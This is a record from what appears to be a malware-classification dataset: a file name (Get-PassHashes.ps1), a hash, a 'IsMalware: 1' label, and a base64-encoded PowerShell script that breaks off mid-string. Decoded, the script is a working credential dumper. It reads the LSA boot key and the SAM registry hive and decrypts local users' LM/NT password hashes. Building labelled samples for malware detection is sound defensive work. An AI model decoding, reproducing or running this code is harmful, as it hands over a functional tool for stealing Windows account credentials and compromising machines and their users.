Get-PassHashes.ps1,2494e861d25ed93d6377472bb81526aa,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gR2V0LVBhc3NIYXNoZXMgeyAKCltDbWRsZXRCaW5kaW5nKCldClBhcmFtICgpCgpmdW5jdGlvbiBMb2FkQXBpCnsKICAgICRvbGRFcnJvckFjdGlvbiA9ICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlOwogICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAiU2lsZW50bHlDb250aW51ZSI7CiAgICAkdGVzdCA9IFtQb3dlckR1bXAuTmF0aXZlXTsKICAgICRnbG9iYWw6RXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJG9sZEVycm9yQWN0aW9uOwogICAgaWYgKCR0ZXN0KQogICAgewogICAgICAgICMgYWxyZWFkeSBsb2FkZWQKICAgICAgICByZXR1cm47CiAgICAgfQoKJGNvZGUgPSBAJwp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CgpuYW1lc3BhY2UgUG93ZXJEdW1wCnsKICAgIHB1YmxpYyBjbGFzcyBOYXRpdmUKICAgIHsKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBSZWdPcGVuS2V5RXgoCiAgICAgICAgaW50IGhLZXksCiAgICAgICAgc3RyaW5nIHN1YktleSwKICAgICAgICBpbnQgdWxPcHRpb25zLAogICAgICAgIGludCBzYW1EZXNpcmVkLAogICAgICAgIG91dCBpbnQgaGtSZXN1bHQpOwoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiUmVnRW51bUtleUV4IildCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnRW51bUtleUV4KAogICAgICAgIGludCBoa2V5LAogICAgICAgIGludCBpbmRleCwKICAgICAgICBTdHJpbmdCdWlsZGVyIGxwTmFtZSwKICAgICAgICByZWYgaW50IGxwY2JOYW1lLAogICAgICAgIGludCByZXNlcnZlZCwKICAgICAgICBTdHJpbmdCdWlsZGVyIGxwQ2xhc3MsCiAgICAgICAgcmVmIGludCBscGNiQ2xhc3MsCiAgICAgICAgb3V0IGxvbmcgbHBmdExhc3RXcml0ZVRpbWUpOwoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQ9IlJlZ1F1ZXJ5SW5mb0tleSIsIENhbGxpbmdDb252ZW50aW9uPUNhbGxpbmdDb252ZW50aW9uLldpbmFwaSwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgZXh0ZXJuIHB1YmxpYyBzdGF0aWMgaW50IFJlZ1F1ZXJ5SW5mb0tleSgKICAgICAgICBpbnQgaGtleSwKICAgICAgICBTdHJpbmdCdWlsZGVyIGxwQ2xhc3MsCiAgICAgICAgcmVmIGludCBscGNiQ2xhc3MsCiAgICAgICAgaW50IGxwUmVzZXJ2ZWQsCiAgICAgICAgb3V0IGludCBscGNTdWJLZXlzLAogICAgICAgIG91dCBpbnQgbHBjYk1heFN1YktleUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JNYXhDbGFzc0xlbiwKICAgICAgICBvdXQgaW50IGxwY1ZhbHVlcywKICAgICAgICBvdXQgaW50IGxwY2JNYXhWYWx1ZU5hbWVMZW4sCiAgICAgICAgb3V0IGludCBscGNiTWF4VmFsdWVMZW4sCiAgICAgICAgb3V0IGludCBscGNiU2VjdXJpdHlEZXNjcmlwdG9yLAogICAgICAgIEludFB0ciBscGZ0TGFzdFdyaXRlVGltZSk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFJlZ0Nsb3NlS2V5KAogICAgICAgIGludCBoS2V5KTsKCiAgICAgICAgfQogICAgfSAvLyBlbmQgbmFtZXNwYWNlIFBvd2VyRHVtcAoKICAgIHB1YmxpYyBjbGFzcyBTaGlmdCB7CiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgICBSaWdodChpbnQgeCwgICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVpbnQgIFJpZ2h0KHVpbnQgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgbG9uZyAgUmlnaHQobG9uZyB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1bG9uZyBSaWdodCh1bG9uZyB4LCBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGludCAgICBMZWZ0KGludCB4LCAgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCAgIExlZnQodWludCB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBsb25nICAgTGVmdChsb25nIHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nICBMZWZ0KHVsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgfQonQAoKICAgJHByb3ZpZGVyID0gTmV3LU9iamVjdCBNaWNyb3NvZnQuQ1NoYXJwLkNTaGFycENvZGVQcm92aWRlcgogICAkZGxsTmFtZSA9IFtQc09iamVjdF0uQXNzZW1ibHkuTG9jYXRpb24KICAgJGNvbXBpbGVyUGFyYW1ldGVycyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIuQ29tcGlsZXJQYXJhbWV0ZXJzCiAgICRhc3NlbWJsaWVzID0gQCgiU3lzdGVtLmRsbCIsICRkbGxOYW1lKQogICAkY29tcGlsZXJQYXJhbWV0ZXJzLlJlZmVyZW5jZWRBc3NlbWJsaWVzLkFkZFJhbmdlKCRhc3NlbWJsaWVzKQogICAkY29tcGlsZXJQYXJhbWV0ZXJzLkdlbmVyYXRlSW5NZW1vcnkgPSAkdHJ1ZQogICAkY29tcGlsZXJSZXN1bHRzID0gJHByb3ZpZGVyLkNvbXBpbGVBc3NlbWJseUZyb21Tb3VyY2UoJGNvbXBpbGVyUGFyYW1ldGVycywgJGNvZGUpCiAgIGlmKCRjb21waWxlclJlc3VsdHMuRXJyb3JzLkNvdW50IC1ndCAwKSB7CiAgICAgJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMgfCAlIHsgV3JpdGUtRXJyb3IgKCJ7MH06YHR7MX0iIC1mICRfLkxpbmUsJF8uRXJyb3JUZXh0KSB9CiAgIH0KCn0KCiRhbnRwYXNzd29yZCA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIk5UUEFTU1dPUkRgMCIpOwokYWxtcGFzc3dvcmQgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCJMTVBBU1NXT1JEYDAiKTsKJGVtcHR5X2xtID0gW2J5dGVbXV1AKDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSwweGFhLDB4ZDMsMHhiNCwweDM1LDB4YjUsMHgxNCwweDA0LDB4ZWUpOwokZW1wdHlfbnQgPSBbYnl0ZVtdXUAoMHgzMSwweGQ2LDB4Y2YsMHhlMCwweGQxLDB4NmEsMHhlOSwweDMxLDB4YjcsMHgzYywweDU5LDB4ZDcsMHhlMCwweGMwLDB4ODksMHhjMCk7CiRvZGRfcGFyaXR5ID0gQCgKICAxLCAxLCAyLCAyLCA0LCA0LCA3LCA3LCA4LCA4LCAxMSwgMTEsIDEzLCAxMywgMTQsIDE0LAogIDE2LCAxNiwgMTksIDE5LCAyMSwgMjEsIDIyLCAyMiwgMjUsIDI1LCAyNiwgMjYsIDI4LCAyOCwgMzEsIDMxLAogIDMyLCAzMiwgMzUsIDM1LCAzNywgMzcsIDM4LCAzOCwgNDEsIDQxLCA0MiwgNDIsIDQ0LCA0NCwgNDcsIDQ3LAogIDQ5LCA0OSwgNTAsIDUwLCA1MiwgNTIsIDU1LCA1NSwgNTYsIDU2LCA1OSwgNTksIDYxLCA2MSwgNjIsIDYyLAogIDY0LCA2NCwgNjcsIDY3LCA2OSwgNjksIDcwLCA3MCwgNzMsIDczLCA3NCwgNzQsIDc2LCA3NiwgNzksIDc5LAogIDgxLCA4MSwgODIsIDgyLCA4NCwgODQsIDg3LCA4NywgODgsIDg4LCA5MSwgOTEsIDkzLCA5MywgOTQsIDk0LAogIDk3LCA5NywgOTgsIDk4LDEwMCwxMDAsMTAzLDEwMywxMDQsMTA0LDEwNywxMDcsMTA5LDEwOSwxMTAsMTEwLAogIDExMiwxMTIsMTE1LDExNSwxMTcsMTE3LDExOCwxMTgsMTIxLDEyMSwxMjIsMTIyLDEyNCwxMjQsMTI3LDEyNywKICAxMjgsMTI4LDEzMSwxMzEsMTMzLDEzMywxMzQsMTM0LDEzNywxMzcsMTM4LDEzOCwxNDAsMTQwLDE0MywxNDMsCiAgMTQ1LDE0NSwxNDYsMTQ2LDE0OCwxNDgsMTUxLDE1MSwxNTIsMTUyLDE1NSwxNTUsMTU3LDE1NywxNTgsMTU4LAogIDE2MSwxNjEsMTYyLDE2MiwxNjQsMTY0LDE2NywxNjcsMTY4LDE2OCwxNzEsMTcxLDE3MywxNzMsMTc0LDE3NCwKICAxNzYsMTc2LDE3OSwxNzksMTgxLDE4MSwxODIsMTgyLDE4NSwxODUsMTg2LDE4NiwxODgsMTg4LDE5MSwxOTEsCiAgMTkzLDE5MywxOTQsMTk0LDE5NiwxOTYsMTk5LDE5OSwyMDAsMjAwLDIwMywyMDMsMjA1LDIwNSwyMDYsMjA2LAogIDIwOCwyMDgsMjExLDIxMSwyMTMsMjEzLDIxNCwyMTQsMjE3LDIxNywyMTgsMjE4LDIyMCwyMjAsMjIzLDIyMywKICAyMjQsMjI0LDIyNywyMjcsMjI5LDIyOSwyMzAsMjMwLDIzMywyMzMsMjM0LDIzNCwyMzYsMjM2LDIzOSwyMzksCiAgMjQxLDI0MSwyNDIsMjQyLDI0NCwyNDQsMjQ3LDI0NywyNDgsMjQ4LDI1MSwyNTEsMjUzLDI1MywyNTQsMjU0Cik7CgpmdW5jdGlvbiBzaWRfdG9fa2V5KCRzaWQpCnsKICAgICRzMSA9IEAoKTsKICAgICRzMSArPSBbY2hhcl0oJHNpZCAtYmFuZCAweEZGKTsKICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCw4KSAtYmFuZCAweEZGKTsKICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwxNikgLWJhbmQgMHhGRik7CiAgICAkczEgKz0gW2NoYXJdKFtTaGlmdF06OlJpZ2h0KCRzaWQsMjQpIC1iYW5kIDB4RkYpOwogICAgJHMxICs9ICRzMVswXTsKICAgICRzMSArPSAkczFbMV07CiAgICAkczEgKz0gJHMxWzJdOwogICAgJHMyID0gQCgpOwogICAgJHMyICs9ICRzMVszXTsgJHMyICs9ICRzMVswXTsgJHMyICs9ICRzMVsxXTsgJHMyICs9ICRzMVsyXTsKICAgICRzMiArPSAkczJbMF07ICRzMiArPSAkczJbMV07ICRzMiArPSAkczJbMl07CiAgICByZXR1cm4gLCgoc3RyX3RvX2tleSAkczEpLChzdHJfdG9fa2V5ICRzMikpOwp9CgpmdW5jdGlvbiBzdHJfdG9fa2V5KCRzKQp7CiAgICAka2V5ID0gQCgpOwogICAgJGtleSArPSBbU2hpZnRdOjpSaWdodChbaW50XSgkc1swXSksIDEgKTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1swXSkgLWJhbmQgMHgwMSksIDYpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbMV0pLDIpOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzFdKSAtYmFuZCAweDAzKSwgNSkgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1syXSksMyk7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMl0pIC1iYW5kIDB4MDcpLCA0KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzNdKSw0KTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1szXSkgLWJhbmQgMHgwRiksIDMpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNF0pLDUpOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzRdKSAtYmFuZCAweDFGKSwgMikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s1XSksNik7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNV0pIC1iYW5kIDB4M0YpLCAxKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzZdKSw3KTsKICAgICRrZXkgKz0gJChbaW50XSgkc1s2XSkgLWJhbmQgMHg3Rik7CiAgICAwLi43IHwgJXsKICAgICAgICAka2V5WyRfXSA9IFtTaGlmdF06OkxlZnQoJGtleVskX10sIDEpOwogICAgICAgICRrZXlbJF9dID0gJG9kZF9wYXJpdHlbJGtleVskX11dOwogICAgICAgIH0KICAgIHJldHVybiAsJGtleTsKfQoKZnVuY3Rpb24gTmV3UkM0KFtieXRlW11dJGtleSkKewogICAgcmV0dXJuIG5ldy1vYmplY3QgT2JqZWN0IHwKICAgIEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IGtleSAka2V5IC1QYXNzVGhydSB8CiAgICBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSBTICRudWxsIC1QYXNzVGhydSB8CiAgICBBZGQtTWVtYmVyIFNjcmlwdE1ldGhvZCBpbml0IHsKICAgICAgICBpZiAoLW5vdCAkdGhpcy5TKQogICAgICAgIHsKICAgICAgICAgICAgW2J5dGVbXV0kdGhpcy5TID0gMC4uMjU1OwogICAgICAgICAgICAwLi4yNTUgfCAlIC1iZWdpbntbbG9uZ10kaj0wO317CiAgICAgICAgICAgICAgICAkaiA9ICgkaiArICR0aGlzLmtleVskKCRfICUgJHRoaXMua2V5Lkxlbmd0aCldICsgJHRoaXMuU1skX10pICUgJHRoaXMuUy5MZW5ndGg7CiAgICAgICAgICAgICAgICAkdGVtcCA9ICR0aGlzLlNbJF9dOyAkdGhpcy5TWyRfXSA9ICR0aGlzLlNbJGpdOyAkdGhpcy5TWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgU2NyaXB0TWV0aG9kICJlbmNyeXB0IiB7CiAgICAgICAgJGRhdGEgPSAkYXJnc1swXTsKICAgICAgICAkdGhpcy5pbml0KCk7CiAgICAgICAgJG91dGJ1ZiA9IG5ldy1vYmplY3QgYnl0ZVtdICQoJGRhdGEuTGVuZ3RoKTsKICAgICAgICAkUzIgPSAkdGhpcy5TWzAuLiR0aGlzLlMuTGVuZ3RoXTsKICAgICAgICAwLi4kKCRkYXRhLkxlbmd0aC0xKSB8ICUgLWJlZ2lueyRpPTA7JGo9MDt9IHsKICAgICAgICAgICAgJGkgPSAoJGkrMSkgJSAkUzIuTGVuZ3RoOwogICAgICAgICAgICAkaiA9ICgkaiArICRTMlskaV0pICUgJFMyLkxlbmd0aDsKICAgICAgICAgICAgJHRlbXAgPSAkUzJbJGldOyRTMlskaV0gPSAkUzJbJGpdOyRTMlskal0gPSAkdGVtcDsKICAgICAgICAgICAgJGEgPSAkZGF0YVskX107CiAgICAgICAgICAgICRiID0gJFMyWyAkKCRTMlskaV0rJFMyWyRqXSkgJSAkUzIuTGVuZ3RoIF07CiAgICAgICAgICAgICRvdXRidWZbJF9dID0gKCRhIC1ieG9yICRiKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICwkb3V0YnVmOwogICAgfSAtUGFzc1RocnUKfQoKZnVuY3Rpb24gZGVzX2VuY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJHRydWUpCn0KCmZ1bmN0aW9uIGRlc19kZWNyeXB0KFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSkKewogICAgcmV0dXJuICwoZGVzX3RyYW5zZm9ybSAkZGF0YSAka2V5ICRmYWxzZSkKfQoKZnVuY3Rpb24gZGVzX3RyYW5zZm9ybShbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXksICRkb0VuY3J5cHQpCnsKICAgICRkZXMgPSBuZXctb2JqZWN0IFNlY3VyaXR5LkNyeXB0b2dyYXBoeS5ERVNDcnlwdG9TZXJ2aWNlUHJvdmlkZXI7CiAgICAkZGVzLk1vZGUgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpFQ0I7CiAgICAkZGVzLlBhZGRpbmcgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6Tm9uZTsKICAgICRkZXMuS2V5ID0gJGtleTsKICAgICRkZXMuSVYgPSAka2V5OwogICAgJHRyYW5zZm9ybSA9ICRudWxsOwogICAgaWYgKCRkb0VuY3J5cHQpIHskdHJhbnNmb3JtID0gJGRlcy5DcmVhdGVFbmNyeXB0b3IoKTt9CiAgICBlbHNleyR0cmFuc2Zvcm0gPSAkZGVzLkNyZWF0ZURlY3J5cHRvcigpO30KICAgICRyZXN1bHQgPSAkdHJhbnNmb3JtLlRyYW5zZm9ybUZpbmFsQmxvY2soJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7CiAgICByZXR1cm4gLCRyZXN1bHQ7Cn0KCmZ1bmN0aW9uIEdldC1SZWdLZXlDbGFzcyhbc3RyaW5nXSRrZXksIFtzdHJpbmddJHN1YmtleSkKewogICAgc3dpdGNoICgkS2V5KSB7CiAgICAgICAgIkhLQ1IiIHsgJG5LZXkgPSAweDgwMDAwMDAwfSAjSEsgQ2xhc3NlcyBSb290CiAgICAgICAgIkhLQ1UiIHsgJG5LZXkgPSAweDgwMDAwMDAxfSAjSEsgQ3VycmVudCBVc2VyCiAgICAgICAgIkhLTE0iIHsgJG5LZXkgPSAweDgwMDAwMDAyfSAjSEsgTG9jYWwgTWFjaGluZQogICAgICAgICJIS1UiICB7ICRuS2V5ID0gMHg4MDAwMDAwM30gI0hLIFVzZXJzCiAgICAgICAgIkhLQ0MiIHsgJG5LZXkgPSAweDgwMDAwMDA1fSAjSEsgQ3VycmVudCBDb25maWcKICAgICAgICBkZWZhdWx0IHsKICAgICAgICAgICAgdGhyb3cgIkludmFsaWQgS2V5LiBVc2Ugb25lIG9mIHRoZSBmb2xsb3dpbmcgb3B0aW9ucyBIS0NSLCBIS0NVLCBIS0xNLCBIS1UsIEhLQ0MiCiAgICAgICAgfQogICAgfQogICAgJEtFWVFVRVJZVkFMVUUgPSAweDE7CiAgICAkS0VZUkVBRCA9IDB4MTk7CiAgICAkS0VZQUxMQUNDRVNTID0gMHgzRjsKICAgICRyZXN1bHQgPSAiIjsKICAgIFtpbnRdJGhrZXk9MAogICAgaWYgKC1ub3QgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdPcGVuS2V5RXgoJG5rZXksJHN1YmtleSwwLCRLRVlSRUFELFtyZWZdJGhrZXkpKQogICAgewogICAgCSRjbGFzc1ZhbCA9IE5ldy1PYmplY3QgVGV4dC5TdHJpbmdidWlsZGVyIDEwMjQKICAgIAlbaW50XSRsZW4gPSAxMDI0CiAgICAJaWYgKC1ub3QgW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdRdWVyeUluZm9LZXkoJGhrZXksJGNsYXNzVmFsLFtyZWZdJGxlbiwwLFtyZWZdJG51bGwsW3JlZl0kbnVsbCwKICAgIAkJW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLDApKQogICAgCXsKICAgIAkJJHJlc3VsdCA9ICRjbGFzc1ZhbC5Ub1N0cmluZygpCiAgICAJfQogICAgCWVsc2UKICAgIAl7CiAgICAJCVdyaXRlLUVycm9yICJSZWdRdWVyeUluZm9LZXkgZmFpbGVkIjsKICAgIAl9CiAgICAJW1Bvd2VyRHVtcC5OYXRpdmVdOjpSZWdDbG9zZUtleSgkaGtleSkgfCBPdXQtTnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgCVdyaXRlLUVycm9yICJDYW5ub3Qgb3BlbiBrZXkiOwogICAgfQogICAgcmV0dXJuICRyZXN1bHQ7Cn0KCmZ1bmN0aW9uIEdldC1Cb290S2V5CnsKICAgICRzID0gW3N0cmluZ106OkpvaW4oIiIsJCgiSkQiLCJTa2V3MSIsIkdCRyIsIkRhdGEiIHwgJXtHZXQtUmVnS2V5Q2xhc3MgIkhLTE0iICJTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxMc2FcJF8ifSkpOwogICAgJGIgPSBuZXctb2JqZWN0IGJ5dGVbXSAkKCRzLkxlbmd0aC8yKTsKICAgIDAuLiQoJGIuTGVuZ3RoLTEpIHwgJXskYlskX10gPSBbQ29udmVydF06OlRvQnl0ZSgkcy5TdWJzdHJpbmcoJCgkXyoyKSwyKSwxNil9CiAgICAkYjIgPSBuZXctb2JqZWN0IGJ5dGVbXSAxNjsKICAgIDB4OCwgMHg1LCAweDQsIDB4MiwgMHhiLCAweDksIDB4ZCwgMHgzLCAweDAsIDB4NiwgMHgxLCAweGMsIDB4ZSwgMHhhLCAweGYsIDB4NyB8ICUgLWJlZ2lueyRpPTA7fXskYjJbJGldPSRiWyRfXTskaSsrfQogICAgcmV0dXJuICwkYjI7Cn0KCmZ1bmN0aW9uIEdldC1IQm9vdEtleQp7CiAgICBwYXJhbShbYnl0ZVtdXSRib290a2V5KTsKICAgICRhcXdlcnR5ID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiIUAjJCVeJiooKXF3ZXJ0eVVJT1BBenhjdmJubVFRUVFRUVFRUVFRUSkoKkAmJWAwIik7CiAgICAkYW51bSA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIjAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODlgMCIpOwogICAgJGsgPSBHZXQtSXRlbSBIS0xNOlxTQU1cU0FNXERvbWFpbnNcQWNjb3VudDsKICAgIGlmICgtbm90ICRrKSB7cmV0dXJuICRudWxsfQogICAgW2J5dGVbXV0kRiA9ICRrLkdldFZhbHVlKCJGIik7CiAgICBpZiAoLW5vdCAkRikge3JldHVybiAkbnVsbH0KICAgICRyYzRrZXkgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENV06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKCRGWzB4NzAuLjB4N0ZdICsgJGFxd2VydHkgKyAkYm9vdGtleSArICRhbnVtKTsKICAgICRyYzQgPSBOZXdSQzQgJHJjNGtleTsKICAgIHJldHVybiAsKCRyYzQuZW5jcnlwdCgkRlsweDgwLi4weDlGXSkpOwp9CgpmdW5jdGlvbiBHZXQtVXNlck5hbWUoW2J5dGVbXV0kVikKewogICAgaWYgKC1ub3QgJFYpIHtyZXR1cm4gJG51bGx9OwogICAgJG9mZnNldCA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MGMuLjB4MGZdLDApICsgMHhDQzsKICAgICRsZW4gPSBbQml0Q29udmVydGVyXTo6VG9JbnQzMigkVlsweDEwLi4weDEzXSwwKTsKICAgIHJldHVybiBbVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRWLCAkb2Zmc2V0LCAkbGVuKTsKfQoKZnVuY3Rpb24gR2V0LVVzZXJIYXNoZXMoJHUsIFtieXRlW11dJGhib290a2V5KQp7CiAgICBbYnl0ZVtdXSRlbmNfbG1faGFzaCA9ICRudWxsOyBbYnl0ZVtdXSRlbmNfbnRfaGFzaCA9ICRudWxsOwogICAgCiAgICAjIGNoZWNrIGlmIGhhc2hlcyBleGlzdCAoaWYgYnl0ZSBtZW1vcnkgZXF1YWxzIHRvIDIwLCB0aGVuIHdlJ3ZlIGdvdCBhIGhhc2gpCiAgICAkTE1fZXhpc3RzID0gJGZhbHNlOwogICAgJE5UX2V4aXN0cyA9ICRmYWxzZTsKICAgICMgTE0gaGVhZGVyIGNoZWNrCiAgICBpZiAoJHUuVlsweGEwLi4weGEzXSAtZXEgMjApCiAgICB7CiAgICAgICAgJExNX2V4aXN0cyA9ICR0cnVlOwogICAgfQogICAgIyBOVCBoZWFkZXIgY2hlY2sKICAgIGVsc2VpZiAoJHUuVlsweGFjLi4weGFmXSAtZXEgMjApCiAgICB7CiAgICAgICAgJE5UX2V4aXN0cyA9ICR0cnVlOwogICAgfQoKICAgIGlmICgkTE1fZXhpc3RzIC1lcSAkdHJ1ZSkKICAgIHsKICAgICAgICAkbG1faGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgNDsKICAgICAgICAkbnRfaGFzaF9vZmZzZXQgPSAkdS5IYXNoT2Zmc2V0ICsgOCArIDB4MTA7CiAgICAgICAgJGVuY19sbV9oYXNoID0gJHUuVlskKCRsbV9oYXNoX29mZnNldCkuLiQoJGxtX2hhc2hfb2Zmc2V0KzB4MGYpXTsKICAgICAgICAkZW5jX250X2hhc2ggPSAkdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgfQoJCiAgICBlbHNlaWYgKCROVF9leGlzdHMgLWVxICR0cnVlKQogICAgewogICAgICAgICRudF9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA4OwogICAgICAgICRlbmNfbnRfaGFzaCA9IFtieXRlW11dJHUuVlskKCRudF9oYXNoX29mZnNldCkuLiQoJG50X2hhc2hfb2Zmc2V0KzB4MGYpXTsKICAgIH0KICAgIHJldHVybiAsKERlY3J5cHRIYXNoZXMgJHUuUmlkICRlbmNfbG1faGFzaCAkZW5jX250X2hhc2ggJGhib290a2V5KTsKfQoKZnVuY3Rpb24gRGVjcnlwdEhhc2hlcygkcmlkLCBbYnl0ZVtdXSRlbmNfbG1faGFzaCwgW2J5dGVbXV0kZW5jX250X2hhc2gsIFtieXRlW11dJGhib290a2V5KQp7CiAgICBbYnl0ZVtdXSRsbWhhc2ggPSAkZW1wdHlfbG07IFtieXRlW11dJG50aGFzaD0kZW1wdHlfbnQ7CiAgICAjIExNIEhhc2gKICAgIGlmICgkZW5jX2xtX2hhc2gpCiAgICB7CiAgICAgICAgJGxtaGFzaCA9IERlY3J5cHRTaW5nbGVIYXNoICRyaWQgJGhib290a2V5ICRlbmNfbG1faGFzaCAkYWxtcGFzc3dvcmQ7CiAgICB9CgogICAgIyBOVCBIYXNoCiAgICBpZiAoJGVuY19udF9oYXNoKQogICAgewogICAgICAgICRudGhhc2ggPSBEZWNyeXB0U2luZ2xlSGFzaCAkcmlkICRoYm9vdGtleSAkZW5jX250X2hhc2ggJGFudHBhc3N3b3JkOwogICAgfQoKICAgIHJldHVybiAsKCRsbWhhc2gsJG50aGFzaCkKfQoKZnVuY3Rpb24gRGVjcnlwdFNpbmdsZUhhc2goJHJpZCxbYnl0ZVtdXSRoYm9vdGtleSxbYnl0ZVtdXSRlbmNfaGFzaCxbYnl0ZVtdXSRsbW50c3RyKQp7CiAgICAkZGVza2V5cyA9IHNpZF90b19rZXkgJHJpZDsKICAgICRtZDUgPSBbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENV06OkNyZWF0ZSgpOwogICAgJHJjNF9rZXkgPSAkbWQ1LkNvbXB1dGVIYXNoKCRoYm9vdGtleVswLi4weDBmXSArIFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcmlkKSArICRsbW50c3RyKTsKICAgICRyYzQgPSBOZXdSQzQgJHJjNF9rZXk7CiAgICAkb2Jma2V5ID0gJHJjNC5lbmNyeXB0KCRlbmNfaGFzaCk7CiAgICAkaGFzaCA9IChkZXNfZGVjcnlwdCAgJG9iZmtleVswLi43XSAkZGVza2V5c1swXSkgKwogICAgICAgIChkZXNfZGVjcnlwdCAkb2Jma2V5WzguLiQoJG9iZmtleS5MZW5ndGggLSAxKV0gJGRlc2tleXNbMV0pOwogICAgcmV0dXJuICwkaGFzaDsKfQoKZnVuY3Rpb24gR2V0LVVzZXJLZXlzCnsKICAgIGxzIEhLTE06XFNBTVxTQU1cRG9tYWluc1xBY2NvdW50XFVzZXJzIHwKICAgICAgICB3aGVyZSB7JF8uUFNDaGlsZE5hbWUgLW1hdGNoICJeWzAtOUEtRmEtZl17OH0kIn0gfAogICAgICAgICA